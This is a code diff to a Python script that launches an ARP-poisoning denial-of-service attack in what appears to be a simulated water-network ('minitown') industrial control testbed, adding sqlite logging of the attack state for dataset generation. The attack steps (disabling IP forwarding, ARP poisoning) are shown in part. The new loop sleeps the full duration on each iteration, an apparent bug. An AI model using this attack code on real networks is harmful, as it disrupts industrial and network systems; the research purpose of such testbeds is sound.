@@ -6,7 +6,9 @@ import sys
 import shlex
 import subprocess
 
-dos_message_duration = 210
+import sqlite3
+
+dos_message_duration = 110
 
 targetip = "192.168.1.20"
 sourceip = "192.168.1.10"
@@ -14,6 +16,8 @@ sourceip = "192.168.1.10"
 targetmac="a"
 sourcemac="b"
 
+conn = sqlite3.connect('../../ICS_topologies/minitown_topology_dataset_generation/minitown_db.sqlite')
+c = conn.cursor()
 
 def start_forwarding():
     args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
@@ -29,12 +33,22 @@ def start():
 
     print "[*] Launching DoS"
     stop_forwarding()
-    time.sleep(dos_message_duration)
+
+    dos_count = 0
+    while dos_count < dos_message_duration:
+        c.execute("UPDATE minitown SET value = 4 WHERE name = 'ATT_1'")
+        conn.commit()
+        dos_count += 1
+        time.sleep(dos_message_duration)
+
+    print "[*] Stopping DoS"
+    c.execute("UPDATE minitown SET value = 0 WHERE name = 'ATT_1'")
+    conn.commit()
 
     start_forwarding()
     restorearp(sourceip, sourcemac, targetip, targetmac)
     restorearp(targetip, targetmac, sourceip, sourcemac)
-    print "[*] Stopping DoS"
+
 
 def launch_arp_poison():
     print("[*] launching arp poison")
